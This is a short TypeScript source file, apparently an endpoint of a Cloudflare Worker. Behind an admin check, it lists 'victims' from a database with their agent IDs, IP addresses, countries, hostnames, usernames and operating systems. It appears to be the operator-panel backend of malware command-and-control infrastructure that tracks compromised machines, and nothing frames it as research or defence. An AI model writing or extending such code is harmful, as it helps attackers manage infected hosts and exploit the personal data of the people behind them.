import { requireAdmin } from "../core/auth"
import { json } from "../core/response"
import { Env } from "../types/env"

export async function getVictims(
  request: Request,
  env: Env
): Promise<Response> {

  const auth = requireAdmin(request, env)
  if (auth) return auth

  try {
    // Query D1 for all victims
    const { results } = await env.RESULTS_DB.prepare(`
      SELECT 
        agent_id,
        first_seen,
        last_seen,
        ip,
        country,
        user_agent,
        hostname,
        username,
        os
      FROM victims
      ORDER BY last_seen DESC
    `).all()

    console.log('D1 query returned:', results?.length || 0, 'victims')
    console.log('Sample data:', results?.[0])

    return json(results || [], 200, {
      "Cache-Control": "private, max-age=5"
    })
  } catch (err) {
    console.error('Error fetching victims:', err)
    return json({ error: 'Failed to fetch victims', details: String(err) }, 500)
  }
}